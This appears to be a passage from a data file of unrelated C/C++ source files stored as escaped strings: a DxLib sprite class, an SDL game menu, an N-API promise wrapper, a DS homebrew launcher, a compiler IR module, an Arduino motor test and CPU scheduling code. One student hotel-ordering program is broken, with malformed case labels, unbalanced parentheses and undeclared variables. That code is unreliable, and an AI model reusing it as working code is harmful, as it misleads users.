\u88dc\u52a9\u30c6\u30af\u30b9\u30c1\u30e3\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u306a\u3044\u306e\u3067uv\u56fa\u5b9a\n        Vertex[i].su = 0.0f;\n        Vertex[i].sv = 0.0f;\n    }\n\n    // \uff12\u30dd\u30ea\u30b4\u30f3\u5206\u306e\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u30c7\u30fc\u30bf\u3092\u30bb\u30c3\u30c8\n    Index[0] = 0;\n    Index[1] = 1;\n    Index[2] = 2;\n    Index[3] = 3;\n    Index[4] = 2;\n    Index[5] = 1;\n}\n\n/// <summary>\n/// \u30b5\u30a4\u30ba\u3068\u30dd\u30b8\u30b7\u30e7\u30f3\u306b\u5fdc\u3058\u3066\uff14\u9802\u70b9\u5206\u306e\u9802\u70b9\u4f4d\u7f6e\u3092\u8abf\u6574\n/// </summary>\n/// <param name=\"position\">\u30dd\u30b8\u30b7\u30e7\u30f3</param>\n/// <param name=\"chipSize\">\u914d\u7f6e\u3059\u308b\u30ef\u30fc\u30eb\u30c9\u30b9\u30d7\u30e9\u30a4\u30c8\u306e\u30b5\u30a4\u30ba</param>\nvoid WorldSprite::SetTransform(const VECTOR& position, float spriteSize)\n{\n    this->position = position;\n    // \u30d4\u30dc\u30c3\u30c8\u4e2d\u5fc3\u3067\u8a2d\u5b9a\n    //spriteSize\u306f0.725\n    //\u5de6\u4e0a\u3001\u53f3\u4e0a\u3001\u5de6\u4e0b\u3001\u53f3\u4e0b\u306b\u5ea7\u6a19\u3092\u8a2d\u5b9a\n    Vertex[0].pos = VScale(VGet(-1.0f, 1.0f, 0.0f), spriteSize * 0.5f);\n    Vertex[1].pos = VScale(VGet(1.0f, 1.0f, 0.0f), spriteSize * 0.5f);\n    Vertex[2].pos = VScale(VGet(-1.0, -1.0f, 0.0f), spriteSize * 0.5f);\n    Vertex[3].pos = VScale(VGet(1.0f, -1.0f, 0.0f), spriteSize * 0.5f);\n    for (int i = 0; i < 4; i++)\n    {\n        Vertex[i].pos = VAdd(Vertex[i].pos, position);\n    }\n}\n\n/// <summary>\n/// \u63cf\u753b\n/// </summary>\nvoid WorldSprite::Draw()\n{\n    // \uff12\u30dd\u30ea\u30b4\u30f3\u306e\u63cf\u753b\n    //4\u306f\u9802\u70b9\u306e\u65702\u304c\u30dd\u30ea\u30b4\u30f3\u306e\u6570\n    DrawPolygonIndexed3D(Vertex, 4, Index, 2, textureGraph, TRUE);\n}\n",
    "#include \"menu.h\"\n\nvoid init_menu(SDL_Window*& window, SDL_Renderer*& render)\n{\n\twindow = SDL_CreateWindow(u8\"\u00c8\u00e3\u00f0\u00e0 <2048>\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1024, 768, SDL_WINDOW_SHOWN);\n\trender = SDL_CreateRenderer(window, -1, 0);\n}\n\nvoid load_menu_music(Mix_Music* music, const char* file_name)\n{\n\tmusic = Mix_LoadMUS(file_name);\n\tMix_PlayMusic(music, -1);\n}\n\nvoid load_game_sound(Mix_Chunk* sound, const char* file_name)\n{\n\tsound = Mix_LoadWAV(file_name);\n\tif (sound == nullptr) cout << Mix_GetError();\n\tMix_PlayChannel(-1, sound, 0);\n}\n\nSDL_Texture* get_text_texture(SDL_Renderer*& render, char* text, TTF_Font* font)\n{\n\tSDL_Surface* textSurface = NULL;\n\tSDL_Color fore_color = { 130, 140, 50 };\n\tSDL_Color back_color = { 255, 218, 185 };\n\ttextSurface = TTF_RenderUTF8_Shaded(font, text, fore_color, back_color);\n\tSDL_SetColorKey(textSurface, SDL_TRUE, SDL_MapRGB(textSurface->format, 255, 218, 185));\n\tSDL_Texture* texture = SDL_CreateTextureFromSurface(render, textSurface);\n\tSDL_FreeSurface(textSurface);\n\treturn texture;\n}\n\nSDL_Texture* get_start_texture(SDL_Renderer*& render, char* text, TTF_Font* font)\n{\n\tSDL_Surface* textSurface = NULL;\n\tSDL_Color fore_color = { 188, 143, 143 };\n\tSDL_Color back_color = { 255, 218, 185 };\n\ttextSurface = TTF_RenderUTF8_Shaded(font, text, fore_color, back_color);\n\tSDL_SetColorKey(textSurface, SDL_TRUE, SDL_MapRGB(textSurface->format, 255, 218, 185));\n\tSDL_Texture* texture = SDL_CreateTextureFromSurface(render, textSurface);\n\tSDL_FreeSurface(textSurface);\n\treturn texture;\n}\n\nvoid draw_text(SDL_Renderer*& render, SDL_Texture* texture)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\n\tSDL_Rect rect = { 300, 30, text_width, text_height };\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nvoid draw_start(SDL_Renderer*& render, SDL_Texture* texture)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\tSDL_Rect rect = { 255, 300, 500, 90 };\n\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nvoid draw_game_mode(SDL_Renderer*& render, SDL_Texture* texture, SDL_Rect rect)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nvoid draw_exit(SDL_Renderer*& render, SDL_Texture* texture)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\tSDL_Rect rect = { 960, 0, 64, 64 };\n\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nvoid draw_music(SDL_Renderer*& render, SDL_Texture* texture, SDL_Rect rect)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nvoid draw_sound(SDL_Renderer*& render, SDL_Texture* texture, SDL_Rect rect)\n{\n\tint text_width = 0;\n\tint text_height = 0;\n\tSDL_QueryTexture(texture, NULL, NULL, &text_width, &text_height);\n\n\tSDL_RenderCopy(render, texture, nullptr, &rect);\n}\n\nbool is_game_mode_hit(SDL_Rect rect, int x, int y)\n{\n\tif (rect.w == 0 || rect.h == 0) return false;\n\tif ((x >= rect.x) && (x < rect.w + rect.x) && (y >= rect.y) && (y < rect.h + rect.y)) return true;\n\treturn false;\n}\n\nbool is_exit_musuc_sound_hit(SDL_Rect rect, int x, int y)\n{\n\tif (rect.w == 0 || rect.h == 0) return false;\n\tif ((x >= rect.x) && (x < rect.w + rect.x) && (y >= rect.y) && (y < rect.h + rect.y)) return true;\n\treturn false;\n}\n\nSDL_Texture* LoadTextureFromFile(const char* filename, SDL_Renderer* render, SDL_Window* window)\n{\n\tSDL_Surface* surface = SDL_LoadBMP(filename);\n\tif (surface == NULL)\n\t{\n\t\tcout << \"Couldn't load image \" << filename << \"!\" << \" Error: \" << SDL_GetError() << endl;\n\t\t\n\t}\n\tSDL_Texture* texture = SDL_CreateTextureFromSurface(render, surface);\n\tSDL_FreeSurface(surface);\n\treturn texture;\n}",
    "#include \"ThreadSafeDeferred.h\"\n\nThreadSafeDeferred::ThreadSafeDeferred(const Napi::Env env)\n: Deferred(env)\n, fate(EFate::UNRESOLVED)\n, createValueCb(NULL)\n, errorMsg(\"\")\n, tsf {Napi::ThreadSafeFunction::New(env, Napi::Function::New(env, [](const Napi::CallbackInfo &info) {}), \n\t\"ThreadSafeDeferred\", 0, 1, [this](Napi::Env env) {\n\t\t// this access happens from another thread. \n\t\t// However, no synchronization is needed as\n\t\t// the other thread cannot modify this instance\n\t\t// anymore after calling Resolve or Reject.\n\t\tif (this->fate == EFate::RESOLVED) {\n\t\t\tif (this->createValueCb == NULL) {\n\t\t\t\tNapi::Promise::Deferred::Resolve(env.Undefined());\n\t\t\t} else {\n\t\t\t\tNapi::Promise::Deferred::Resolve(this->createValueCb(env));\n\t\t\t}\n\t\t} else {\n\t\t\tNapi::Promise::Deferred::Reject(Napi::Error::New(env, this->errorMsg).Value());\n\t\t}\n\t\ttry {\n\t\t\tdelete this;\n\t\t} catch (const std::runtime_error&) {\n\t\t\t// Well... obviously this deferred was not allocated on heap\n\t\t}\n\t}\n)} {}\n\nvoid ThreadSafeDeferred::Resolve() {\n\tif (this->fate != EFate::UNRESOLVED) throw \"Cannot resolve a promise which is not unresolved anymore.\";\n\tthis->fate = EFate::RESOLVED;\n\tthis->tsf.Release();\n}\n\nvoid ThreadSafeDeferred::Resolve(const createValueCb_t createValueCb) {\n\tif (this->fate != EFate::UNRESOLVED) throw \"Cannot resolve a promise which is not unresolved anymore.\";\n\tthis->createValueCb = createValueCb;\n\tthis->fate = EFate::RESOLVED;\n\tthis->tsf.Release();\n}\n\nvoid ThreadSafeDeferred::Reject(const std::string & errorMsg) {\n\tif (this->fate != EFate::UNRESOLVED) throw \"Cannot reject a promise which is not unresolved anymore.\";\n\tthis->errorMsg = errorMsg;\n\tthis->fate = EFate::REJECTED;\n\tthis->tsf.Release();\n}",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int quant;\r\n    int choice;\r\n    //Quantity\r\n    int Qrooms=0, Qpasta=0, Qburger=0, Qnoodles=0, Qshake=0, Qchicken=0;\r\n    //Food items sold\r\n    int Srooms=0,Spasta=0, Sburger=0, Snoodles=0, Sshake=0, Schicken=0;\r\n    //Total price of items\r\n    int Total_rooms=0, Total_pasta=0, Total_burger=0, Total_noodles=0, Total_shake=0, Total_chicken=0;\r\n\r\n    cout<<\"\\n\\t Quantity of items we have\";\r\n    cout<<\"\\n Rooms available: \";\r\n    cin>>Qrooms;\r\n    cout<<\"\\n Quantity of pasta: \";\r\n    cin>>Qpasta;\r\n    cout<<\"\\n Quantity of burger: \";\r\n    cin>>Qburger;\r\n    cout<<\"\\n Quantity of shake: \";\r\n    cin>>Qshake;\r\n    cout<<\"\\n Quantity of noodles: \";\r\n    cin>>Qnoodles;\r\n    cout<<\"\\n Quantity of chicken-roll: \";\r\n    cin>>Qchicken;\r\n\r\n\r\n    m:\r\n    cout<<\"\\n\\t\\t\\t Please select from the menu options \";\r\n    cout<<\"\\n\\n1) Rooms\";\r\n    cout<<\"\\n2) Pasta\";\r\n    cout<<\"\\n3 Burger\";\r\n    cout<<\"\\n4 Noodles\";\r\n    cout<<\"\\n5 Shake\";\r\n    cout<<\"\\n6 Chicken-roll\";\r\n    cout<<\"\\n7 Information regarding sales and collection \";\r\n    cout<<\"\\n8 Exit\";\r\n\r\n    cout<<\"\\n\\n Please Enter your choice: \";\r\n    cin>>choice;\r\n\r\n    switch(choice)\r\n    {\r\n    case 1:\r\n        cout<<\"n\\n Enter the number of rooms you want: \";\r\n        cin>>quant;\r\n        if(Qrooms-Srooms >=quant)\r\n        {\r\n           Srooms=Srooms+quant;\r\n            Total_rooms=Total_rooms+(quant*1200);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"room/rooms have been alloted to you!\";\r\n        }\r\n        else\r\n            cout<<\"\\n\\tOnly\"<<Qrooms-Srooms<<\"Rooms remaining in hotel \";\r\n            break;\r\n\r\n    case 2;\r\n        cout<<\"n\\n Enter Pasta Quantity :\";\r\n\r\n        cin>>quant;\r\n        if(Qpasta-Spasta >=quant)\r\n        {\r\n            Spasta=Spasta+quant;\r\n            Total_pasta=Total_pasta+quant*250);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"Pasta is the order! \";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\\tOnly\"<<Qpasta-Spasta<<\"pasta remaining in hotel \";\r\n            break;\r\n\r\n            case 3;\r\n        cout<<\"n\\n Enter Burger Quantity :\";\r\n\r\n        cin>>quant;\r\n        if(Qburger-Sburger >=quant)\r\n        {\r\n            Sburger=Sburger+quant;\r\n            Total_burger=Total_burger+quant*250);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"Burger is the order! \";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\\tOnly\"<<Qburger-Sburger<<\"Burger remaining in hotel \";\r\n            break;\r\n\r\n\r\n        case 4;\r\n        cout<<\"n\\n Enter Noodles Quantity :\";\r\n\r\n        cin>>quant;\r\n        if(Qnoodle-Snoodle >=quant)\r\n        {\r\n            Snoodle=Snoodle+quant;\r\n            Total_noodle=Total_noodle+quant*140);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"Noodles is the order! \";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\\tOnly\"<<Qnoodle-Snoodle<<\"Burger remaining in hotel \";\r\n            break;\r\n\r\n\r\n             case 5;\r\n        cout<<\"n\\n Enter Shake Quantity :\";\r\n\r\n        cin>>quant;\r\n        if(Qshake-Sshake >=quant)\r\n        {\r\n            Sshake=Sshake+quant;\r\n            Total_shake=Total_shake+quant*120);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"Shakes is the order! \";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\\tOnly\"<<Qshake-Sshake<<\"Burger remaining in hotel \";\r\n            break;\r\n\r\n\r\n             case 6;\r\n        cout<<\"n\\n Enter Chicken-roll Quantity :\";\r\n\r\n        cin>>quant;\r\n        if(Qchicken-Schicken >=quant)\r\n        {\r\n            Schicken=Schicken+quant;\r\n            Total_chicken=Total_chicken+quant*150);\r\n            cout<<\"\\n\\n\\t\\t\"<<quant<<\"Chicken-roll is the order! \";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\\tOnly\"<<Qnoodle-Snoodle<<\"Burger remaining in hotel \";\r\n            break;\r\n\r\n\r\n             case 7:\r\n\r\n                cout<<\"\\n\\t\\tDetails of sales and collection \";\r\n                cout<<\"\\n\\n Number of rooms we had : \"<<Qrooms;\r\n                cout<<\"\\n\\n Number of rooms we gave for rent \"<<Srooms;\r\n                cout<<\"\\n\\n Remaining rooms : \"<<Qrooms-Srooms;\r\n                cout<<\"\\n\\n Total rooms collection for the day : \"<<Total_rooms;\r\n\r\n\r\n                cout<<\"\\n\\n Number of Pastas we had : \"<<Qpasta;\r\n                cout<<\"\\n\\n Number of Pastas we sold \"<<Spasta;\r\n                cout<<\"\\n\\n Remaining Pastas : \"<<Qpasta-Srooms;\r\n                cout<<\"\\n\\n Total Pasta collection for the day : \"<<Total_pasta;\r\n\r\n\r\n                cout<<\"\\n\\n Number of burger we had : \"<<Qburger;\r\n                cout<<\"\\n\\n Number of burger we sold \"<<Sburger;\r\n                cout<<\"\\n\\n Remaining burger : \"<<Qburger-Sburger;\r\n                cout<<\"\\n\\n Total Burger collection for the day : \"<<Total_burger;\r\n\r\n\r\n                cout<<\"\\n\\n Number of Noodles we had : \"<<Qnoodles;\r\n                cout<<\"\\n\\n Number of noodles we sold \"<<Snoodles;\r\n                cout<<\"\\n\\n Remaining noodes : \"<<Qnoodles-Snoodles;\r\n                cout<<\"\\n\\n Total noodels collection for the day : \"<<Total_noodles;\r\n\r\n\r",
    "/*-----------------------------------------------------------------\n Copyright (C) 2005 - 2013\n\tMichael \"Chishm\" Chisholm\n\tDave \"WinterMute\" Murphy\n\tClaudio \"sverx\"\n\n This program is free software; you can redistribute it and/or\n modify it under the terms of the GNU General Public License\n as published by the Free Software Foundation; either version 2\n of the License, or (at your option) any later version.\n\n This program is distributed in the hope that it will be useful,\n but WITHOUT ANY WARRANTY; without even the implied warranty of\n MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n GNU General Public License for more details.\n\n You should have received a copy of the GNU General Public License\n along with this program; if not, write to the Free Software\n Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n------------------------------------------------------------------*/\n#include <nds.h>\n#include <stdio.h>\n#include <fat.h>\n#include <sys/stat.h>\n#include <limits.h>\n\n#include <string.h>\n#include <unistd.h>\n\n#include \"args.h\"\n#include \"file_browse.h\"\n#include \"hbmenu_banner.h\"\n#include \"iconTitle.h\"\n#include \"nds_loader_arm9.h\"\n\n\nusing namespace std;\n\n//---------------------------------------------------------------------------------\nvoid stop (void) {\n//---------------------------------------------------------------------------------\n\twhile (1) {\n\t\tswiWaitForVBlank();\n\t}\n}\n\n//---------------------------------------------------------------------------------\nint main(int argc, char **argv) {\n//---------------------------------------------------------------------------------\n\n\t// overwrite reboot stub identifier\n\t// so tapping power on DSi returns to DSi menu\n\textern u64 *fake_heap_end;\n\t*fake_heap_end = 0;\n\n\ticonTitleInit();\n\n\t// Subscreen as a console\n\tvideoSetModeSub(MODE_0_2D);\n\tvramSetBankH(VRAM_H_SUB_BG);\n\tconsoleInit(NULL, 0, BgType_Text4bpp, BgSize_T_256x256, 15, 0, false, true);\n\n\tif (!fatInitDefault()) {\n\t\tiprintf (\"fatinitDefault failed!\\n\");\n\t\tstop();\n\t}\n\n\tkeysSetRepeat(25,5);\n\n\tvector<string> extensionList = argsGetExtensionList();\n\n\tif(!access(\"/ROMs/gba\", F_OK)) {\n\t\tchdir(\"/ROMs/gba\");\n\t}\n\telse {\n\t\tchdir(\"/\");\n\t}\n\n\twhile(1) {\n\n\t\tstring filename = browseForFile(extensionList);\n\n\t\t// Construct a command line\n\t\tvector<string> argarray;\n\t\tif (!argsFillArray(filename, argarray)) {\n\t\t\tiprintf(\"Invalid NDS or arg file selected\\n\");\n\t\t} else {\n\t\t\tiprintf(\"Running %s with %d parameters\\n\", argarray[0].c_str(), argarray.size());\n\n\t\t\t// Make a copy of argarray using C strings, for the sake of runNdsFile\n\t\t\tvector<const char*> c_args;\n\t\t\tfor (const auto& arg: argarray) {\n\t\t\t\tc_args.push_back(arg.c_str());\n\t\t\t}\n\n\t\t\t// Try to run the NDS file with the given arguments\n\t\t\tint err = runNdsFile(c_args[0], c_args.size(), &c_args[0]);\n\t\t\tiprintf(\"Start failed. Error %i\\n\", err);\n\t\t}\n\n\t\targarray.clear();\n\n\t\twhile (1) {\n\t\t\tswiWaitForVBlank();\n\t\t\tscanKeys();\n\t\t\tif (!(keysHeld() & KEY_A)) break;\n\t\t}\n\n\t}\n\n\treturn 0;\n}\n",
    "#include \"../include/Module.h\"\n\n#include \"../include/IRBuilder.h\"\n\n\nnamespace panthera::tiger{\n\n\tModule::Module(Context& ctx) noexcept : context(ctx) {\n\t\tthis->types.alloc(this->context.getTypeVoid());\n\n\t\tthis->types.alloc(this->context.getTypeBool());\n\t\tthis->types.alloc(this->context.getTypePtr());\n\n\t\tthis->types.alloc(this->context.getTypeI8());\n\t\tthis->types.alloc(this->context.getTypeI16());\n\t\tthis->types.alloc(this->context.getTypeI32());\n\t\tthis->types.alloc(this->context.getTypeI64());\n\t\tthis->types.alloc(this->context.getTypeInt());\n\t\tthis->types.alloc(this->context.getTypeISize());\n\n\t\tthis->types.alloc(this->context.getTypeUI8());\n\t\tthis->types.alloc(this->context.getTypeUI16());\n\t\tthis->types.alloc(this->context.getTypeUI32());\n\t\tthis->types.alloc(this->context.getTypeUI64());\n\t\tthis->types.alloc(this->context.getTypeUInt());\n\t\tthis->types.alloc(this->context.getTypeUSize());\n\n\t\tthis->types.alloc(this->context.getTypeF32());\n\t\tthis->types.alloc(this->context.getTypeF64());\n\t};\n\n\n\tauto Module::createFunction(\n\t\tconst std::string& func_name,\n\t\tLinkage linkage,\n\t\tType::ID return_type,\n\t\tevo::ArrayProxy<Function::ParamInfo> param_infos\n\t) noexcept -> Function::ID {\n\t\treturn this->functions.alloc(*this, func_name, linkage, return_type, param_infos);\n\t};\n\n\tauto Module::createFunction(\n\t\tstd::string&& func_name,\n\t\tLinkage linkage,\n\t\tType::ID return_type,\n\t\tevo::ArrayProxy<Function::ParamInfo> param_infos\n\t) noexcept -> Function::ID {\n\t\treturn this->functions.alloc(*this, std::move(func_name), linkage, return_type, param_infos);\n\t};\n\n\n\tauto Module::getFunction(Function::ID id) noexcept -> Function& {\n\t\treturn this->functions[id];\n\t};\n\n\tauto Module::getFunction(Function::ID id) const noexcept -> const Function& {\n\t\treturn this->functions[id];\n\t};\n\n\n\n\tauto Module::createStruct(const std::string& name, evo::ArrayProxy<Type::ID> members) noexcept -> Type::ID {\n\t\treturn this->get_or_create_user_type(Struct(name, members));\n\t};\n\n\tauto Module::createStruct(std::string&& name, evo::ArrayProxy<Type::ID> members) noexcept -> Type::ID {\n\t\treturn this->get_or_create_user_type(Struct(std::move(name), members));\n\t};\n\n\tauto Module::getStruct(Type::ID id) noexcept -> Struct& {\n\t\tconst UserType::ID user_type_id = this->types[id].getUser();\n\t\treturn this->user_types[user_type_id].value.as<Struct>();\n\t};\n\n\tauto Module::getStruct(Type::ID id) const noexcept -> const Struct& {\n\t\tconst UserType::ID user_type_id = this->types[id].getUser();\n\t\treturn this->user_types[user_type_id].value.as<Struct>();\n\t};\n\n\n\n\n\n\t\n\tauto Module::merge(Module& import_module) noexcept -> void {\n\t\t[[maybe_unused]] const Module& _ = import_module;\n\t\tevo::fatalBreak(__FUNCTION__ \" Not implemented yet\");\n\t};\n\n\n\tauto Module::print() const noexcept -> std::string {\n\t\tauto output = std::string();\n\n\t\tconst char* architecture = [&]() noexcept {\n\t\t\tswitch(this->context.getTarget().getArchitecture()){\n\t\t\t\tcase Architecture::x86_32: return \"x86_32\";\n\t\t\t\tcase Architecture::x86_64: return \"x86_64\";\n\t\t\t\tcase Architecture::ARM:    return \"ARM\";\n\t\t\t\tcase Architecture::ARM64:  return \"ARM64\";\n\t\t\t\tcase Architecture::RISC_V: return \"RISC_V\";\n\t\t\t};\n\n\t\t\tevo::debugFatalBreak(\"Unknown or unsupported architecture\");\n\t\t}();\n\n\t\tconst char* platform = [&]() noexcept {\n\t\t\tswitch(this->context.getTarget().getPlatform()){\n\t\t\t\tcase Platform::Windows: return \"Windows\";\n\t\t\t\tcase Platform::Linux:   return \"Linux\";\n\t\t\t\tcase Platform::MacOS:   return \"MacOS\";\n\t\t\t};\n\n\t\t\tevo::debugFatalBreak(\"Unknown or unsupported platform\");\n\t\t}();\n\n\n\t\toutput += std::format(\"architecture = \\\"{}\\\"\\nplatform = \\\"{}\\\"\\n\\n\", architecture, platform);\n\n\n\t\tthis->user_types.forEach([&](const UserType& user_type) noexcept -> void {\n\t\t\tif(user_type.value.is<Struct>()){\n\t\t\t\tconst Struct& struct_data = user_type.value.as<Struct>();\n\n\t\t\t\toutput += std::format(\"struct @{} = {{\", struct_data.getName());\n\n\t\t\t\tconst evo::ArrayProxy<Type::ID> members = struct_data.getMembers();\n\t\t\t\tfor(size_t i = 0; i < members.size(); i+=1){\n\t\t\t\t\toutput += this->printType(members[i]);\n\n\t\t\t\t\tif(i + 1 < members.size()){\n\t\t\t\t\t\toutput += \", \";\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\toutput += \"};\\n\";\n\t\t\t}\n\t\t});\n\n\t\toutput += '\\n';\n\n\t\t// TODO: make interface to remove const_cast\n\t\tconst auto builder = IRBuilder(const_cast<Module&>(*this));\n\t\tfor(Global::ID global_id : this->globals){\n\t\t\tconst Global& global = builder.getGlobal(global_id);\n\n\t\t\tif(global.isConst){\n\t\t\t\toutput += std::format(\"global const @{} = {}\\n\", global.name, this->printExpr(global.value));\n\t\t\t}else{\n\t\t\t\toutput += std::format(\"global @{} = {}\\n\", global.name, this->printExpr(global.value));\n\t\t\t}\n\t\t}\n\n\t\toutput += '\\n';\n\n\t\tthis->functions.forEach([&](const Function& func) noexcept -> void {\n\t\t\toutput += func.print();\n\t\t\toutput += '\\n';\n\t\t});\n\t\t\n\n\t\treturn output;\n\t};\n\n\n\tauto Module::typeIsBuiltin(Type::ID id) const noexcept -> bool {\n\t\tconst Type& type = this->types[id];\n\t\treturn type.isBuiltin();\n\t};\n\n\tauto Module::typeIsNumeric(Type::ID id) const noexcept -> bool {\n\t\tconst Type& type = this->types[",
    "#include <Arduino.h>\n\nconst int IS = 4;\nconst int INH = 5;\nconst int IN = 6;\n\nconst int pwmChannel = 0;\nconst int pwmFreq = 5000;\nconst int resolution = 8;\n\nvoid setup()\n{\n  Serial.begin(9600);\n  pinMode(IS, INPUT);\n  pinMode(INH, OUTPUT);\n  pinMode(IN, OUTPUT);\n\n  ledcSetup(pwmChannel, pwmFreq, resolution);\n  ledcAttachPin(IN, pwmChannel);\n}\n\nvoid loop()\n{\n  // step 1 (Not considering IS value) ////////////////////////////////////////////////////\n  digitalWrite(INH, HIGH);\n  delay(10);\n  for (int i = 0; i <= resolution; i++) // increse the motor speed\n  {\n    ledcWrite(pwmChannel, i);\n    delay(8);\n  }\n  for (int i = resolution; i >= 0; i--) // decrese the motor speed\n  {\n    ledcWrite(pwmChannel, i);\n    delay(8);\n  }\n  // Step 2 (Considering IS value as 1 or 0) //////////////////////////////////////////////\n  /*if (IS == LOW)\n  {\n    digitalWrite(INH, HIGH);\n    delay(10);\n    for (int i = 0; i <= resolution; i++) // increse the motor speed\n    {\n      ledcWrite(pwmChannel, i);\n      delay(8);\n    }\n    for (int i = resolution; i >= 0; i--) // decrese the motor speed\n    {\n      ledcWrite(pwmChannel, i);\n      delay(8);\n    }\n  }\n  else\n  {\n    digitalWrite(INH, LOW);\n    ledcWrite(pwmChannel, 0);\n  } */\n  // Step 3 (Considering the IS value as analog reading) /////////////////////////////////\n  /*int pwmIS = analogRead(IS);\n  if (pwmIS <= 150)\n  {\n    digitalWrite(INH, HIGH);\n    delay(10);\n    for (int i = 0; i <= resolution; i++) // increse the motor speed\n    {\n      ledcWrite(pwmChannel, i);\n      delay(8);\n    }\n    for (int i = resolution; i >= 0; i--) // decrese the motor speed\n    {\n      ledcWrite(pwmChannel, i);\n      delay(8);\n    }\n  }\n  else\n  {\n    digitalWrite(INH, LOW);\n    ledcWrite(pwmChannel, 0);\n  } */\n}",
    "#include<iostream>\n#include<climits>\n#include<queue>\nusing namespace std;\n\nstruct process{\n  int processId;\n  int arrivalTime;\n  int burstTime;\n  int completionTime;\n  int TurnAroundTime;\n  int WaitingTime;\n  int ResponseTime=INT_MAX;\n  int remainingArrivalTime;\n  int remainingBurstTime;\n  int priority;\n  int remainingpriority;\n};\n\nvoid print(process proc[],int n);\nint checkFCFS(process proc [], int n);\nbool checkSJF(process proc [], int n);\nbool checkPriority(process proc[],int n);\n\nvoid FCFS(process proc[],int n){\n    cout<<\"**********************************************************************************\"<<endl;\n    cout<<endl;\n    cout<<\"FCFS Scheduling Algorithmn: \"<<endl<<endl;\n    cout<<\"GANT CHART (order showing which process completed first): \"<<endl;\n   int currentTime=0;\n   while(1){\n    int minIndex=-1,minValue=INT_MAX;\n    for(int i=0;i<n;i++){\n        if(proc[i].arrivalTime<=currentTime){\n            if(proc[i].remainingArrivalTime<minValue){\n                   minValue=proc[i].remainingArrivalTime;\n                   minIndex=i;\n            }\n        }\n    }\n    if(minIndex!=-1){\n        proc[minIndex].ResponseTime=currentTime-proc[minIndex].arrivalTime;\n        proc[minIndex].completionTime=proc[minIndex].burstTime+currentTime;\n        currentTime+=proc[minIndex].burstTime;\n        proc[minIndex].remainingArrivalTime=INT_MAX;\n        cout<<\"P\"<<proc[minIndex].processId<<\"--->\";\n    }\n    else{\n        currentTime++;\n        if(checkFCFS(proc,n)) {\n            cout<<endl;\n        for(int i=0;i<n;i++){\n                proc[i].TurnAroundTime=proc[i].completionTime-proc[i].arrivalTime;\n                proc[i].WaitingTime=proc[i].TurnAroundTime-proc[i].burstTime;\n            }\n            break;\n        }\n    }\n\n   }\n    print(proc,n);\n    cout<<\"**********************************************************************************\"<<endl;\n}\n\nvoid SJF(process proc[],int n){\n    cout<<endl;\n    cout<<\"**********************************************************************************\"<<endl;\n    cout<<\"SJF Scheduling Algorithmn: \"<<endl<<endl;\n   int currentTime=0;\n   cout<<\"GANT CHART (order showing which process completed first): \"<<endl;\n   while(1){\n    int minIndex=-1,minValue=INT_MAX;\n    for(int i=0;i<n;i++){\n        if(proc[i].arrivalTime <= currentTime){\n            if(proc[i].remainingBurstTime<minValue){\n                   minValue=proc[i].remainingBurstTime;\n                   minIndex=i;\n            }\n        }\n    }\n    if(minIndex!=-1){\n        proc[minIndex].completionTime=currentTime+proc[minIndex].burstTime;\n        proc[minIndex].ResponseTime=currentTime-proc[minIndex].arrivalTime;\n        currentTime+=proc[minIndex].burstTime;\n        proc[minIndex].remainingBurstTime=INT_MAX;\n        cout<<\"P\"<<proc[minIndex].processId<<\"--->\";\n    }\n    else{\n        currentTime++;\n        if(checkSJF(proc,n)) {\n        for(int i=0;i<n;i++){\n                proc[i].TurnAroundTime=proc[i].completionTime-proc[i].arrivalTime;\n                proc[i].WaitingTime=proc[i].TurnAroundTime-proc[i].burstTime;\n            }\n            break;\n        }\n    }\n   }\n    print(proc,n);\n    cout<<\"**********************************************************************************\"<<endl;\n}\n\nvoid SRTF(process proc[],int n){\ncout<<endl;\n    cout<<\"**********************************************************************************\"<<endl;\n    cout<<\"SRTF Scheduling Algorithmn: \"<<endl<<endl;\n    int currentTime=0;\n    cout<<\"GANT CHART (order showing which process completed first): \"<<endl;\n    while(1){\n        int minIndex=-1,minValue=INT_MAX;\n        for(int i=0;i<n;i++){\n            if(proc[i].arrivalTime<=currentTime){\n                if(proc[i].remainingBurstTime<minValue){\n                    minValue=proc[i].remainingBurstTime;\n                    minIndex=i;\n                }\n            }\n        }\n        if(minIndex!=-1){\n            currentTime++;\n            proc[minIndex].remainingBurstTime--;\n            if(proc[minIndex].ResponseTime==INT_MAX){\n                proc[minIndex].ResponseTime=currentTime-proc[minIndex].arrivalTime-1;\n            }\n            if(proc[minIndex].remainingBurstTime==0){\n                proc[minIndex].completionTime=currentTime;\n                proc[minIndex].remainingBurstTime=INT_MAX;\n                cout<<\"P\"<<proc[minIndex].processId<<\"--->\";\n            }\n        }\n        else{\n     